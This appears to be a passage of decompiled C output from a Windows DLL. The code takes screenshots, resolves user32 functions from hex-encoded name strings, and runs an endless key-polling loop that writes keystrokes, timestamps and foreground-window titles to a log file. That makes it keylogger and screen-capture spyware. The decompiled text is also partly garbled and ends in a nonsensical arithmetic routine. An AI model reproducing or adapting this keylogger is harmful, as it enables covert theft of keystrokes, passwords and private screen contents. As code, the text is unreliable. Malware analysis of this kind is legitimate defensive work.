    int32_t * hdc2 = CreateCompatibleDC(hdc); // 0x100015f3
    int32_t lpbmi = 40; // bp-68, 0x10001622
    int32_t ppvBits; // bp-176, 0x10001530
    int32_t * h = CreateDIBSection(hdc, (struct __MIDL___MIDL_itf_mfobjects_0000_0008_0002 *)&lpbmi, 1, (int32_t **)&ppvBits, NULL, 0); // 0x10001663
    if (h == NULL) {
        // 0x10001671
        DeleteDC(hdc2);
        DeleteDC(hdc);
        GdiplusShutdown(v3);
        return _40___security_check_cookie_40_4();
    }
    int32_t v6 = (int32_t)h; // 0x10001663
    int32_t nSavedDC = SaveDC(hdc2); // 0x1000169b
    SelectObject(hdc2, h);
    int32_t v7; // 0x10001530
    int32_t v8; // 0x10001530
    BitBlt(hdc2, 0, 0, cx, v8 - v7, hdc, 0, 0, 0xcc0020);
    RestoreDC(hdc2, nSavedDC);
    DeleteDC(hdc2);
    DeleteDC(hdc);
    int32_t v9 = 16; // bp-316, 0x100016df
    int32_t * v10 = GdipAlloc(16); // 0x100016e1
    int32_t * v11 = &v9; // 0x100016ee
    int32_t v12 = 0; // 0x100016ee
    if (v10 != NULL) {
        // 0x100016f0
        v12 = (int32_t)v10;
        *v10 = (int32_t)&g21;
        int32_t v13 = v6; // bp-328, 0x100016fc
        v5 = 0;
        *(int32_t *)(v12 + 8) = GdipCreateBitmapFromHBITMAP(h, NULL, (int32_t **)&v5);
        *(int32_t *)(v12 + 4) = v5;
        v11 = &v13;
    }
    int32_t v14 = (int32_t)v11;
    int32_t v15 = 1; // bp-100, 0x10001725
    int128_t v16; // 0x10001530
    __asm_movdqu(v16, __asm_movdqu_11(0x1d5be4b5));
    function_10001310(4, &v1);
    *(int32_t *)(v14 - 4) = (int32_t)&v15;
    int32_t v17; // bp-116, 0x10001530
    *(int32_t *)(v14 - 8) = (int32_t)&v17;
    *(int32_t *)(v14 - 16) = *(int32_t *)(v12 + 4);
    int32_t v18 = GdipSaveImageToFile(&g161, (int16_t *)&g161, &g161, &g161); // 0x10001758
    if (v18 != 0) {
        // 0x10001764
        *(int32_t *)(v12 + 8) = v18;
    }
    // 0x1000176b
    *(int32_t *)(v14 - 20) = 1;
    *(int32_t *)(v14 - 24) = v6;
    DeleteObject(&g161);
    *(int32_t *)(v14 - 28) = v3;
    GdiplusShutdown((int32_t)&g161);
    return _40___security_check_cookie_40_4();
}

// Address range: 0x100017a0 - 0x10001801
int32_t function_100017a0(void) {
    int32_t * hFile = CreateFileW((int16_t *)&g90, 4, 1, NULL, 4, 128, NULL); // 0x100017b8
    g71 = (int32_t)hFile;
    int32_t v1; // 0x100017a0
    int32_t v2 = v1;
    int32_t v3 = v2 + 2; // 0x100017d3
    while (*(int16_t *)v2 != 0) {
        // 0x100017d0
        v2 = v3;
        v3 = v2 + 2;
    }
    // 0x100017db
    int32_t lpBuffer; // 0x100017a0
    WriteFile(hFile, (int32_t *)lpBuffer, -2 - lpBuffer + v3 & -2, &g109, NULL);
    return CloseHandle((int32_t *)g71);
}

// Address range: 0x10001810 - 0x10001a26
int32_t function_10001810(void) {
    // 0x10001810
    int32_t v1; // bp-4, 0x10001810
    int32_t v2 = g66 ^ (int32_t)&v1; // 0x1000181e
    g95 = (char *)0x72657355;
    g96 = 0x642e3233;
    *(int16_t *)&g97 = 0x6c6c;
    *(char *)&g98 = 0;
    __asm_movdqa(*(int128_t *)&g95, __asm_movdqa_9(0x6e6957646e756f726765726f46746547));
    g99 = 0x776f64;
    int32_t v3 = *(int32_t *)(v2 + 120 + *(int32_t *)(v2 + 60)) + v2; // 0x10001885
    int32_t v4 = function_10007210(v2, (char *)&g95); // 0x1000188c
    uint16_t v5 = *(int16_t *)(2 * v4 + v2 + *(int32_t *)(v3 + 36)); // 0x1000189a
    int32_t v6 = *(int32_t *)(*(int32_t *)(v3 + 28) + v2 + 4 * (int32_t)v5); // 0x100018a4
    __asm_movdqa(*(int128_t *)&g95, __asm_movdqa_9(g48));
    g99 = 0x65636f72;
    g100 = 0x64497373;
    *(char *)&g101 = 0;
    g114 = v6 + v2;
    function_10007210(v2, (char *)&g95);
    int32_t * lpKeyState = _malloc(256); // 0x10001925
    __asm_movdqa(*(int128_t *)&g95, __asm_movdqa_9(g58));
    *(char *)&g99 = 0;
    function_100058f0();
    int128_t v7 = __asm_movdqa_9(0x756f79614c6472616f6279654b746547); // 0x1000195e
    __asm_movdqa(*(int128_t *)&g95, v7);
    *(int16_t *)&g99 = 116;
    int32_t dwhkl = function_100058f0(); // 0x1000197e
    int128_t v8 = __asm_xorps(v7, v7); // 0x1000198e
    int16_t pwszBuff = 0; // bp-40, 0x10001991
    int128_t v9; // 0x10001810
    __asm_movdqu(v9, v8);
    int64_t v10; // 0x10001810
    __asm_movq_10(v10, v8);
    int32_t wVirtKey = MapVirtualKeyExW(0, (int32_t)&g161, &g161); // 0x100019a9
    int32_t v11; // 0x10001810
    int32_t v12 = ToUnicodeEx(wVirtKey, 0x10000 * v11 / 0x10000, (char *)lpKeyState, &pwszBuff, 16, 0, (int32_t *)dwhkl); // 0x100019c7
    if ((int16_t)v12 != 0) {
        // 0x100019dc
        __asm_movdqu(0, __asm_movdqa_9(0x5d00540046004900480053005b));
        function_100017a0();
    }
    if (v12 == 0) {
        // 0x100019fe
        pwszBuff = 256 * (int16_t)wVirtKey / 256;
    }
    // 0x10001a07
    function_100017a0();
    _free(lpKeyState);
    return _40___security_check_cookie_40_4();
}

// Address range: 0x10001a30 - 0x10001fae
int32_t function_10001a30(void) {
    int128_t v1 = 0x72657355; // bp-208, 0x10001a4c
    int32_t v2 = &v1; // 0x10001a56
    int32_t v3 = v2; // bp-232, 0x10001a56
    __asm_movdqu(0, __asm_movdqa_9(g59));
    int32_t v4; // 0x10001a30
    int32_t v5 = *(int32_t *)(v4 + 120 + v2) + v2; // 0x10001aa3
    int32_t v6 = function_10007210(v2, (char *)&v1); // 0x10001aaa
    int128_t v7 = __asm_movdqa_9(0x6e6957646e756f726765726f46746547); // 0x10001ab2
    uint16_t v8 = *(int16_t *)(2 * v6 + v2 + *(int32_t *)(v5 + 36)); // 0x10001abd
    int32_t v9 = *(int32_t *)(*(int32_t *)(v5 + 28) + v2 + 4 * (int32_t)v8); // 0x10001ac7
    __asm_movdqu(0, v7);
    g94 = v9 + v2;
    function_10007210(v2, (char *)&v1);
    v1 = 0x57746547;
    int32_t dwMilliseconds = function_100058f0(); // 0x10001b55
    int32_t v10 = &v3; // 0x10001b60
    int128_t v11; // 0x10001a30
    int128_t v12; // 0x10001a30
    while (true) {
      lab_0x10001b66_2:;
        int32_t v13 = v10 - 4; // 0x10001b66
        *(int32_t *)v13 = 30;
        Sleep(dwMilliseconds);
        int32_t v14 = 8;
        int32_t v15 = v13;
        int32_t v16 = &g161;
        int128_t v17 = v12;
        int32_t v18 = 0x10000 * v14 / 0x10000; // 0x10001b73
        int32_t v19 = v15 - 4; // 0x10001b76
        *(int32_t *)v19 = v18;
        int128_t v20 = v17; // 0x10001b85
        int32_t v21 = v19; // 0x10001b85
        int32_t v22; // 0x10001a30
        int32_t v23; // 0x10001a30
        int32_t v24; // 0x10001a30
        int32_t v25; // 0x10001a30
        int32_t v26; // 0x10001a30
        int32_t v27; // 0x10001a30
        int32_t v28; // 0x10001a30
        int32_t v29; // 0x10001a30
        int32_t v30; // 0x10001a30
        int128_t v31; // 0x10001a30
        int32_t v32; // 0x10001ba8
        int16_t v33; // 0x10001bc1
        int32_t * v34; // 0x10001a30
        int32_t v35; // 0x10001c41
        int32_t * v36; // 0x10001c46
        int32_t * v37; // 0x10001c11
        int32_t v38; // 0x10001c11
        int32_t v39; // 0x10001c21
        int16_t v40; // 0x10001bce
        int32_t * v41; // 0x10001c5f
        int32_t * v42; // 0x10001c64
        int32_t * v43; // 0x10001c6c
        int32_t * v44; // 0x10001c74
        int32_t * v45; // 0x10001c7c
        int32_t v46; // 0x10001c84
        int32_t * v47; // 0x10001c84
        unsigned char v48; // 0x10001d20
        int32_t v49; // 0x10001cb3
        int16_t v50; // 0x10001ce0
        if ((int16_t)v16 == -0x7fff) {
            // 0x10001b8b
            g114 = v16;
            *(int32_t *)(v15 - 8) = 1024;
            *(int32_t *)(v15 - 12) = (int32_t)&g110;
            v32 = v15 - 16;
            *(int32_t *)v32 = v16;
            v26 = (int32_t)&g115;
            v23 = (int32_t)&g110;
            v33 = *(int16_t *)v23;
            while (v33 == *(int16_t *)v26) {
                // 0x10001bc9
                v29 = v32;
                if (v33 == 0) {
                    goto lab_0x10001d02_2;
                }
                // 0x10001bce
                v40 = *(int16_t *)(v23 | 2);
                if (v40 != *(int16_t *)(v26 || 2)) {
                    // break -> 0x10001bf4
                    break;
                }
                // 0x10001bd8
                v22 = v23 + 4;
                v25 = v26 + 4;
                v29 = v32;
                if (v40 == 0) {
                    goto lab_0x10001d02_2;
                }
                v26 = v25;
                v23 = v22;
                v33 = *(int16_t *)v23;
            }
            // 0x10001bf4
            *(int32_t *)(v15 - 20) = 0;
            *(int32_t *)(v15 - 24) = 128;
            v34 = (int32_t *)(v15 - 28);
            if (g102 == 0) {
                // 0x10001c39
                *v34 = 4;
                *(int32_t *)(v15 - 32) = 0;
                *(int32_t *)(v15 - 36) = 1;
                *(int32_t *)(v15 - 40) = 4;
                v35 = v15 - 44;
                *(int32_t *)v35 = (int32_t)&g90;
                v36 = CreateFileW((int16_t *)&g161, (int32_t)&g161, (int32_t)&g161, (struct _SECURITY_ATTRIBUTES *)&g161, (int32_t)&g161, (int32_t)&g161, &g161);
                g71 = (int32_t)v36;
                v28 = v35;
            } else {
                // 0x10001c04
                *v34 = 2;
                *(int32_t *)(v15 - 32) = 0;
                *(int32_t *)(v15 - 36) = 2;
                *(int32_t *)(v15 - 40) = 2;
                *(int32_t *)(v15 - 44) = (int32_t)&g90;
                v37 = CreateFileW((int16_t *)&g161, (int32_t)&g161, (int32_t)&g161, (struct _SECURITY_ATTRIBUTES *)&g161, (int32_t)&g161, (int32_t)&g161, &g161);
                v38 = (int32_t)v37;
                *(int32_t *)(v15 - 48) = 0;
                *(int32_t *)(v15 - 52) = (int32_t)&g109;
                *(int32_t *)(v15 - 56) = 2;
                *(int32_t *)(v15 - 60) = (int32_t)&g70;
                v39 = v15 - 64;
                *(int32_t *)v39 = v38;
                g71 = v38;
                WriteFile(&g161, &g161, (int32_t)&g161, &g161, (struct _OVERLAPPED *)&g161);
                g102 = 0;
                v28 = v39;
            }
            // 0x10001c4d
            *(int32_t *)(v28 - 4) = (int32_t)&g103;
            GetLocalTime((struct _SYSTEMTIME *)&g161);
            v41 = (int32_t *)(v28 - 8);
            *v41 = (int32_t)&g110;
            v42 = (int32_t *)(v28 - 12);
            *v42 = (int32_t)g108;
            v43 = (int32_t *)(v28 - 16);
            *v43 = (int32_t)g107;
            v44 = (int32_t *)(v28 - 20);
            *v44 = (int32_t)g106;
            v45 = (int32_t *)(v28 - 24);
            *v45 = (int32_t)g105;
            v46 = v28 - 28;
            v47 = (int32_t *)v46;
            *v47 = (int32_t)g104;
            *(int32_t *)(v28 - 32) = (int32_t)g103;
            *(int32_t *)(v28 - 36) = (int32_t)L"\n\n%04d/%02d/%02d %02d:%02d:%02d - {%s}\n";
            *(int32_t *)(v28 - 40) = (int32_t)&g91;
            wsprintfW((int16_t *)&g161, (int16_t *)&g161);
            v24 = (int32_t)&g91;
            v49 = v24 + 2;
            while (*(int16_t *)v24 != 0) {
                // 0x10001cb0
                v24 = v49;
                v49 = v24 + 2;
            }
            // 0x10001cbb
            *v41 = 0;
            *v42 = (int32_t)&g109;
            *v43 = v49 - (int32_t)&g92;
            *v44 = (int32_t)&g91;
            *v45 = g71;
            WriteFile(&g161, &g161, (int32_t)&g161, &g161, (struct _OVERLAPPED *)&g161);
            v27 = 0;
            v50 = *(int16_t *)(v27 + (int32_t)&g110);
            *(int16_t *)(v27 + 0x10024510) = v50;
            v27 += 2;
            while (v50 != 0) {
                // 0x10001ce0
                v50 = *(int16_t *)(v27 + (int32_t)&g110);
                *(int16_t *)(v27 + 0x10024510) = v50;
                v27 += 2;
            }
            // 0x10001cf6
            *v47 = g71;
            CloseHandle(&g161);
            v29 = v46;
            // 0x10001d02
            v30 = v29;
            if ((int16_t)v14 < 91) {
                // 0x10001fa2
                function_10001810();
                v11 = v17;
                v10 = v30;
                goto lab_0x10001b66;
            }
            // 0x10001d12
            v48 = *(char *)(v18 + 0x10002048);
            g160 = v48;
            v31 = v17;
            v20 = v17;
            v21 = v30;
            switch (v48) {
                case 0: {
                    // 0x10001d4a
                    __asm_movdqu(v17, __asm_movdqa_9(g24));
                    v31 = v17;
                }
                case 6: {
                }
                case 13: {
                }
                case 14: {
                }
                case 15: {
                }
                case 16: {
                }
                case 17: {
                }
                case 18: {
                }
                case 19: {
                }
                case 20: {
                }
                case 21: {
                }
                case 22: {
                }
                case 23: {
                }
                case 24: {
                }
                case 25: {
                }
                case 26: {
                }
                case 27: {
                }
                case 29: {
                }
                case 31: {
                    // 0x10001f89
                    function_100017a0();
                    v20 = v31;
                    v21 = v30;
                    // break -> 0x10001f8e
                    break;
                }
                case 1: {
                    // branch (via goto) -> 0x10001f89
                    goto lab_0x10001f89;
                }
                case 2: {
                    // 0x10001d38
                    __asm_movdqu(v17, __asm_movdqa_9(0x5d005200450054004e0045005b));
                    // branch (via goto) -> 0x10001f89
                    goto lab_0x10001f89;
                }
                case 3: {
                    // branch (via goto) -> 0x10001f89
                    goto lab_0x10001f89;
                }
                case 4: {
                    // branch (via goto) -> 0x10001f89
                    goto lab_0x10001f89;
                }
                case 5: {
                    // 0x10001ee1
                    __asm_movdqu(v17, __asm_movdqa_9(g26));
                    // branch (via goto) -> 0x10001f89
                    goto lab_0x10001f89;
                }
                case 7: {
                    // 0x10001f01
                    __asm_movdqu(v17, __asm_movdqa_9(g27));
                    // branch (via goto) -> 0x10001f89
                    goto lab_0x10001f89;
                }
                case 8: {
                    // 0x10001f17
                    __asm_movdqu(v17, __asm_movdqa_9(g25));
                    // branch (via goto) -> 0x10001f89
                    goto lab_0x10001f89;
                }
                case 9: {
                    // branch (via goto) -> 0x10001f89
                    goto lab_0x10001f89;
                }
                case 10: {
                    // branch (via goto) -> 0x10001f89
                    goto lab_0x10001f89;
                }
                case 11: {
                    // branch (via goto) -> 0x10001f89
                    goto lab_0x10001f89;
                }
                case 12: {
                    // branch (via goto) -> 0x10001f89
                    goto lab_0x10001f89;
                }
                case 28: {
                    // 0x10001db0
                    function_10001810();
                    v20 = v17;
                    v21 = v30;
                    // break -> 0x10001f8e
                    break;
                }
                case 30: {
                    // 0x10001e23
                    function_10001810();
                    v20 = v17;
                    v21 = v30;
                    // break -> 0x10001f8e
                    break;
                }
                case 32: {
                    // 0x10001e3c
                    function_10001810();
                    v20 = v17;
                    v21 = v30;
                    // break -> 0x10001f8e
                    break;
                }
                case 33: {
                    // 0x10001dbf
                    function_10001810();
                    v20 = v17;
                    v21 = v30;
                    // break -> 0x10001f8e
                    break;
                }
                case 34: {
                    // 0x10001dce
                    function_10001810();
                    v20 = v17;
                    v21 = v30;
                    // break -> 0x10001f8e
                    break;
                }
                case 35: {
                    // 0x10001ddd
                    function_10001810();
                    v20 = v17;
                    v21 = v30;
                    // break -> 0x10001f8e
                    break;
                }
                case 36: {
                    // 0x10001dec
                    function_10001810();
                    v20 = v17;
                    v21 = v30;
                    // break -> 0x10001f8e
                    break;
                }
                case 37: {
                    // 0x10001dfb
                    function_10001810();
                    v20 = v17;
                    v21 = v30;
                    // break -> 0x10001f8e
                    break;
                }
                case 38: {
                    // 0x10001e0a
                    function_10001810();
                    v20 = v17;
                    v21 = v30;
                    // break -> 0x10001f8e
                    break;
                }
            }
        }
        int32_t v51 = v21;
        int128_t v52 = v20;
        int32_t v53 = v14 + 1; // 0x10001f8e
        v11 = v52;
        v10 = v51;
        while (v53 < 223) {
            // 0x10001b73
            v14 = v53;
            v15 = v51;
            v16 = 222;
            v17 = v52;
            v18 = 0x10000 * v14 / 0x10000;
            v19 = v15 - 4;
            *(int32_t *)v19 = v18;
            v20 = v17;
            v21 = v19;
            if ((int16_t)v16 == -0x7fff) {
                // 0x10001b8b
                g114 = v16;
                *(int32_t *)(v15 - 8) = 1024;
                *(int32_t *)(v15 - 12) = (int32_t)&g110;
                v32 = v15 - 16;
                *(int32_t *)v32 = v16;
                v26 = (int32_t)&g115;
                v23 = (int32_t)&g110;
                v33 = *(int16_t *)v23;
                while (v33 == *(int16_t *)v26) {
                    // 0x10001bc9
                    v29 = v32;
                    if (v33 == 0) {
                        goto lab_0x10001d02_2;
                    }
                    // 0x10001bce
                    v40 = *(int16_t *)(v23 | 2);
                    if (v40 != *(int16_t *)(v26 || 2)) {
                        // break -> 0x10001bf4
                        break;
                    }
                    // 0x10001bd8
                    v22 = v23 + 4;
                    v25 = v26 + 4;
                    v29 = v32;
                    if (v40 == 0) {
                        goto lab_0x10001d02_2;
                    }
                    v26 = v25;
                    v23 = v22;
                    v33 = *(int16_t *)v23;
                }
                // 0x10001bf4
                *(int32_t *)(v15 - 20) = 0;
                *(int32_t *)(v15 - 24) = 128;
                v34 = (int32_t *)(v15 - 28);
                if (g102 == 0) {
                    // 0x10001c39
                    *v34 = 4;
                    *(int32_t *)(v15 - 32) = 0;
                    *(int32_t *)(v15 - 36) = 1;
                    *(int32_t *)(v15 - 40) = 4;
                    v35 = v15 - 44;
                    *(int32_t *)v35 = (int32_t)&g90;
                    v36 = CreateFileW((int16_t *)&g161, (int32_t)&g161, (int32_t)&g161, (struct _SECURITY_ATTRIBUTES *)&g161, (int32_t)&g161, (int32_t)&g161, &g161);
                    g71 = (int32_t)v36;
                    v28 = v35;
                } else {
                    // 0x10001c04
                    *v34 = 2;
                    *(int32_t *)(v15 - 32) = 0;
                    *(int32_t *)(v15 - 36) = 2;
                    *(int32_t *)(v15 - 40) = 2;
                    *(int32_t *)(v15 - 44) = (int32_t)&g90;
                    v37 = CreateFileW((int16_t *)&g161, (int32_t)&g161, (int32_t)&g161, (struct _SECURITY_ATTRIBUTES *)&g161, (int32_t)&g161, (int32_t)&g161, &g161);
                    v38 = (int32_t)v37;
                    *(int32_t *)(v15 - 48) = 0;
                    *(int32_t *)(v15 - 52) = (int32_t)&g109;
                    *(int32_t *)(v15 - 56) = 2;
                    *(int32_t *)(v15 - 60) = (int32_t)&g70;
                    v39 = v15 - 64;
                    *(int32_t *)v39 = v38;
                    g71 = v38;
                    WriteFile(&g161, &g161, (int32_t)&g161, &g161, (struct _OVERLAPPED *)&g161);
                    g102 = 0;
                    v28 = v39;
                }
                // 0x10001c4d
                *(int32_t *)(v28 - 4) = (int32_t)&g103;
                GetLocalTime((struct _SYSTEMTIME *)&g161);
                v41 = (int32_t *)(v28 - 8);
                *v41 = (int32_t)&g110;
                v42 = (int32_t *)(v28 - 12);
                *v42 = (int32_t)g108;
                v43 = (int32_t *)(v28 - 16);
                *v43 = (int32_t)g107;
                v44 = (int32_t *)(v28 - 20);
                *v44 = (int32_t)g106;
                v45 = (int32_t *)(v28 - 24);
                *v45 = (int32_t)g105;
                v46 = v28 - 28;
                v47 = (int32_t *)v46;
                *v47 = (int32_t)g104;
                *(int32_t *)(v28 - 32) = (int32_t)g103;
                *(int32_t *)(v28 - 36) = (int32_t)L"\n\n%04d/%02d/%02d %02d:%02d:%02d - {%s}\n";
                *(int32_t *)(v28 - 40) = (int32_t)&g91;
                wsprintfW((int16_t *)&g161, (int16_t *)&g161);
                v24 = (int32_t)&g91;
                v49 = v24 + 2;
                while (*(int16_t *)v24 != 0) {
                    // 0x10001cb0
                    v24 = v49;
                    v49 = v24 + 2;
                }
                // 0x10001cbb
                *v41 = 0;
                *v42 = (int32_t)&g109;
                *v43 = v49 - (int32_t)&g92;
                *v44 = (int32_t)&g91;
                *v45 = g71;
                WriteFile(&g161, &g161, (int32_t)&g161, &g161, (struct _OVERLAPPED *)&g161);
                v27 = 0;
                v50 = *(int16_t *)(v27 + (int32_t)&g110);
                *(int16_t *)(v27 + 0x10024510) = v50;
                v27 += 2;
                while (v50 != 0) {
                    // 0x10001ce0
                    v50 = *(int16_t *)(v27 + (int32_t)&g110);
                    *(int16_t *)(v27 + 0x10024510) = v50;
                    v27 += 2;
                }
                // 0x10001cf6
                *v47 = g71;
                CloseHandle(&g161);
                v29 = v46;
                // 0x10001d02
                v30 = v29;
                if ((int16_t)v14 < 91) {
                    // 0x10001fa2
                    function_10001810();
                    v11 = v17;
                    v10 = v30;
                    goto lab_0x10001b66;
                }
                // 0x10001d12
                v48 = *(char *)(v18 + 0x10002048);
                g160 = v48;
                v31 = v17;
                v20 = v17;
                v21 = v30;
                switch (v48) {
                    case 0: {
                        // 0x10001d4a
                        __asm_movdqu(v17, __asm_movdqa_9(g24));
                        v31 = v17;
                    }
                    case 6: {
                    }
                    case 13: {
                    }
                    case 14: {
                    }
                    case 15: {
                    }
                    case 16: {
                    }
                    case 17: {
                    }
                    case 18: {
                    }
                    case 19: {
                    }
                    case 20: {
                    }
                    case 21: {
                    }
                    case 22: {
                    }
                    case 23: {
                    }
                    case 24: {
                    }
                    case 25: {
                    }
                    case 26: {
                    }
                    case 27: {
                    }
                    case 29: {
                    }
                    case 31: {
                        // 0x10001f89
                        function_100017a0();
                        v20 = v31;
                        v21 = v30;
                        // break -> 0x10001f8e
                        break;
                    }
                    case 1: {
                        // branch (via goto) -> 0x10001f89
                        goto lab_0x10001f89;
                    }
                    case 2: {
                        // 0x10001d38
                        __asm_movdqu(v17, __asm_movdqa_9(0x5d005200450054004e0045005b));
                        // branch (via goto) -> 0x10001f89
                        goto lab_0x10001f89;
                    }
                    case 3: {
                        // branch (via goto) -> 0x10001f89
                        goto lab_0x10001f89;
                    }
                    case 4: {
                        // branch (via goto) -> 0x10001f89
                        goto lab_0x10001f89;
                    }
                    case 5: {
                        // 0x10001ee1
                        __asm_movdqu(v17, __asm_movdqa_9(g26));
                        // branch (via goto) -> 0x10001f89
                        goto lab_0x10001f89;
                    }
                    case 7: {
                        // 0x10001f01
                        __asm_movdqu(v17, __asm_movdqa_9(g27));
                        // branch (via goto) -> 0x10001f89
                        goto lab_0x10001f89;
                    }
                    case 8: {
                        // 0x10001f17
                        __asm_movdqu(v17, __asm_movdqa_9(g25));
                        // branch (via goto) -> 0x10001f89
                        goto lab_0x10001f89;
                    }
                    case 9: {
                        // branch (via goto) -> 0x10001f89
                        goto lab_0x10001f89;
                    }
                    case 10: {
                        // branch (via goto) -> 0x10001f89
                        goto lab_0x10001f89;
                    }
                    case 11: {
                        // branch (via goto) -> 0x10001f89
                        goto lab_0x10001f89;
                    }
                    case 12: {
                        // branch (via goto) -> 0x10001f89
                        goto lab_0x10001f89;
                    }
                    case 28: {
                        // 0x10001db0
                        function_10001810();
                        v20 = v17;
                        v21 = v30;
                        // break -> 0x10001f8e
                        break;
                    }
                    case 30: {
                        // 0x10001e23
                        function_10001810();
                        v20 = v17;
                        v21 = v30;
                        // break -> 0x10001f8e
                        break;
                    }
                    case 32: {
                        // 0x10001e3c
                        function_10001810();
                        v20 = v17;
                        v21 = v30;
                        // break -> 0x10001f8e
                        break;
                    }
                    case 33: {
                        // 0x10001dbf
                        function_10001810();
                        v20 = v17;
                        v21 = v30;
                        // break -> 0x10001f8e
                        break;
                    }
                    case 34: {
                        // 0x10001dce
                        function_10001810();
                        v20 = v17;
                        v21 = v30;
                        // break -> 0x10001f8e
                        break;
                    }
                    case 35: {
                        // 0x10001ddd
                        function_10001810();
                        v20 = v17;
                        v21 = v30;
                        // break -> 0x10001f8e
                        break;
                    }
                    case 36: {
                        // 0x10001dec
                        function_10001810();
                        v20 = v17;
                        v21 = v30;
                        // break -> 0x10001f8e
                        break;
                    }
                    case 37: {
                        // 0x10001dfb
                        function_10001810();
                        v20 = v17;
                        v21 = v30;
                        // break -> 0x10001f8e
                        break;
                    }
                    case 38: {
                        // 0x10001e0a
                        function_10001810();
                        v20 = v17;
                        v21 = v30;
                        // break -> 0x10001f8e
                        break;
                    }
                }
            }
            // 0x10001f8e
            v51 = v21;
            v52 = v20;
            v53 = v14 + 1;
            v11 = v52;
            v10 = v51;
        }
        goto lab_0x10001b66;
    }
  lab_0x10001b66:
    // 0x10001b66
    v12 = v11;
    goto lab_0x10001b66_2;
}

// Address range: 0x10002050 - 0x1000216a
int32_t function_10002050(void) {
    // 0x10002050
    int32_t v1; // 0x10002050
    unsigned char v2 = (char)v1;
    int32_t v3; // 0x10002050
    unsigned char v4 = (char)v3; // 0x10002050
    unsigned char v5 = v4 + v2; // 0x10002050
    *(char *)v1 = v5;
    bool v6 = v4 > 153 | v5 < v2;
    bool v7; // 0x10002050
    bool v8; // 0x10002050
    int32_t v9; // 0x10002050
    int32_t v10; // 0x10002050
    int32_t v11; // 0x10002050
    if ((v4 & 14) > 9 || (v4 & 15) + (v2 & 15) > 15) {
        int32_t v12 = (v6 ? 102 : 6) + v3; // 0x10002052
        v7 = v6 | (char)v12 > 153;
        v11 = v12 & 255 | v3 & -256;
        goto lab__thread398;
    } else {
        int32_t v13 = v6 ? v3 + 96 : v3; // 0x10002052
        int32_t v14 = v3 & -256; // 0x10002052
        unsigned char v15 = (char)v13; // 0x10002053
        bool v16 = v6 | v15 > 153;
        v7 = v16;
        v11 = v13 & 255 | v14;
        if ((v15 & 14) > 9) {
            goto lab__thread398;
        } else {
            int32_t v17 = v16 ? v13 + 96 : v13; // 0x10002053
            unsigned char v18 = (char)v17; // 0x10002054
            bool v19 = v16 | v18 > 153;
            v8 = v19;
            v10 = v17 & 255 | v14;
            if ((v18 & 14) > 9) {
                goto lab_dec_label_pc_unknown;
            } else {
                v9 = (v19 ? v17 + 96 : v17) & 255 | v14;
                goto lab_dec_label_pc_unknown_2;
            }
        }
    }
  lab__thread398:;
    int32_t v20 = (v7 ? 102 : 6) + v11; // 0x10002053
    v8 = v7 | (char)v20 > 153;
    v10 = v20 & 255 | v11 & -256;
    goto lab_dec_label_pc_unknown;
  lab_dec_label_pc_unknown:;
    int32_t v21 = v10;
    int32_t v22 = v8 ? 102 : 6;
    v9 = v22 + v21 & 255 | v21 & -256;
    goto lab_dec_label_pc_unknown_2;
  lab_dec_label_pc_unknown_2:;
    uint32_t v23 = v9;
    unsigned char v24 = (char)(v23 / 256); // 0x10002055
    int32_t v25; // 0x10002050
    char v26 = *(char *)&v25; // 0x10002055
    unsigned char v27 = v26 + v24; // 0x10002055
    int32_t v28 = 256 * (int32_t)v27 | v23 & -0xff01; // 0x10002055
    unsigned char v29 = (char)v23; // 0x10002057
    bool v30 = v29 > 153 | v27 < v24;
    bool v31; // 0x10002050
    int32_t v32; // 0x10002050
    int32_t v33; // 0x10002050
    if ((v29 & 14) > 9 || (v24 & 15) + (v26 & 15) > 15) {
        int32_t v34 = (v30 ? 102 : 6) + v23; // 0x10002057
        v31 = v30 | (char)v34 > 153;
        v33 = v34 & 255 | v28 & -256;
        goto lab_dec_label_pc_unknown_3;
    } else {
        int32_t v35 = v30 ? v23 + 96 : v23; // 0x10002057
        int32_t v36 = v28 & -256; // 0x10002057
        unsigned char v37 = (char)v35; // 0x10002058
        bool v38 = v30 | v37 > 153;
        v31 = v38;
        v33 = v36 | v35 & 255;
        if ((v37 & 14) > 9) {
            goto lab_dec_label_pc_unknown_3;
        } else {
            v32 = (v38 ? v35 + 96 : v35) & 255 | v36;
            goto lab_dec_label_pc_unknown_4;
        }
    }
  lab_dec_label_pc_unknown_3:;
    int32_t v39 = v33;
    int32_t v40 = v31 ? 102 : 6;
    v32 = v40 + v39 & 255 | v39 & -256;
    goto lab_dec_label_pc_unknown_4;
  lab_dec_label_pc_unknown_4:;
    uint32_t v41 = v25 + v32; // 0x10002059
    int32_t v42 = v41 + 0x27272727; // 0x1000205c
    unsigned char v43 = (char)v42; // 0x10002061
    bool v44 = v41 > 0xd8d8d8d8 | v43 > 153;
    bool v45; // 0x10002050
    bool v46; // 0x10002050
    bool v47; // 0x10002050
    bool v48; // 0x10002050
    bool v49; // 0x10002050
    bool v50; // 0x10002050
    int32_t v51; // 0x10002050
    int32_t v52; // 0x10002050
    int32_t v53; // 0x10002050
    int32_t v54; // 0x10002050
    int32_t v55; // 0x10002050
    int32_t v56; // 0x10002050
    int32_t v57; // 0x10002050
    if ((v41 & 15) > 8 || (v43 & 14) > 9) {
        int32_t v58 = (v44 ? 102 : 6) + v42; // 0x10002061
        v45 = v44 | (char)v58 > 153;
        v57 = v58 & 255 | v42 & -256;
        goto lab__thread404;
    } else {
        int32_t v59 = v44 ? v41 + 135 : v42; // 0x10002061
        int32_t v60 = v42 & -256; // 0x10002061
        unsigned char v61 = (char)v59; // 0x10002062
        bool v62 = v44 | v61 > 153;
        v45 = v62;
        v57 = v59 & 255 | v60;
        if ((v61 & 14) > 9) {
            goto lab__thread404;
        } else {
            int32_t v63 = v62 ? v59 + 96 : v59; // 0x10002062
            unsigned char v64 = (char)v63; // 0x10002063
            bool v65 = v62 | v64 > 153;
            v46 = v65;
            v56 = v63 & 255 | v60;
            if ((v64 & 14) > 9) {
                goto lab__thread406;
            } else {
                int32_t v66 = v65 ? v63 + 96 : v63; // 0x10002063
                unsigned char v67 = (char)v66; // 0x10002064
                bool v68 = v65 | v67 > 153;
                v47 = v68;
                v55 = v66 & 255 | v60;
                if ((v67 & 14) > 9) {
                    goto lab__thread408;
                } else {
                    int32_t v69 = v68 ? v66 + 96 : v66; // 0x10002064
                    unsigned char v70 = (char)v69; // 0x10002065
                    bool v71 = v68 | v70 > 153;
                    v48 = v71;
                    v54 = v69 & 255 | v60;
                    if ((v70 & 14) > 9) {
                        goto lab__thread410;
                    } else {
                        int32_t v72 = v71 ? v69 + 96 : v69; // 0x10002065
                        unsigned char v73 = (char)v72; // 0x10002066
